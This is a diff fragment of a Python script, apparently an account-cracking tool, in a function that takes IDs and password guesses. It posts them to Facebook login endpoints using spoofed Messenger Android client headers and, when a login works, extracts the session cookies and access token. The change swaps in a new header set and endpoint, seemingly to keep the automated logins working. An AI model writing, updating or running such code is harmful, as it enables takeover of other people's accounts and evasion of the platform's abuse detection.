@@ -1001,25 +1001,22 @@ def m8(ids,pwv):
             "method": "auth.login",
             "fb_api_req_friendly_name": "authenticate",
             "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
-            update={'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12; Pixel 3 Build/SP1A.210812.016.C2) [FBAN/Orca-Android;FBAV/412.0.0.15.69;FBPN/com.facebook.orca;FBLC/en_US;FBBV/481775700;FBCR/Verizon;FBMF/Google;FBBD/google;FBDV/Pixel 3;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2028};FBBK/1;FBLR/0;FB_FW/1;]',
-            'Accept-Encoding':'gzip, deflate',
-            'Connection':'close',
-            'Content-Type':'application/x-www-form-urlencoded',
-            'Host':'graph.facebook.com',
-            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
-            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
-            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-            'X-FB-Connection-Type':'WIFI',
-            'X-Tigon-Is-Retry':'False',
-            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-            'x-fb-device-group':'5120',
-            'X-FB-Friendly-Name':'ViewerReactionsMutation',
-            'X-FB-Request-Analytics-Tags':'graphservice',
-            'X-FB-HTTP-Engine':'Liger',
-            'X-FB-Client-IP':'True',
-            'X-FB-Server-Cluster':'True',
-            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
-            url = 'https://p.facebook.com/method/auth.login'
+            update={
+            'x-fb-connection-quality': 'EXCELLENT',
+            'x-fb-connection-type': 'WIFI',
+            'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 12; Pixel 3 Build/SP1A.210812.016.C2) [FBAN/Orca-Android;FBAV/412.0.0.15.69;FBPN/com.facebook.orca;FBLC/en_US;FBBV/481775700;FBCR/Verizon;FBMF/Google;FBBD/google;FBDV/Pixel 3;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2028};FBBK/1;FBLR/0;FB_FW/1;]',
+            'x-tigon-is-retry': 'False',
+            'x-fb-http-engine': 'Liger',
+            'x-fb-client-ip': 'True',
+            'x-fb-server-cluster': 'True',
+            'x-fb-device-group': '7991',
+            'x-fb-sim-hni': '311390',
+            'x-fb-net-hni': '311390',
+            'x-fb-request-analytics-tags': 'unknown',
+            'authorization': 'OAuth null',
+            'content-type': 'application/x-www-form-urlencoded',
+            'x-fb-friendly-name': 'authenticate'}
+            url = 'https://graph.facebook.com/v12.0/me'
             q = requests.post(url,data=info,headers=update,allow_redirects=False,verify=True).json()
             if 'access_token' in q:
                 coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{coki}"
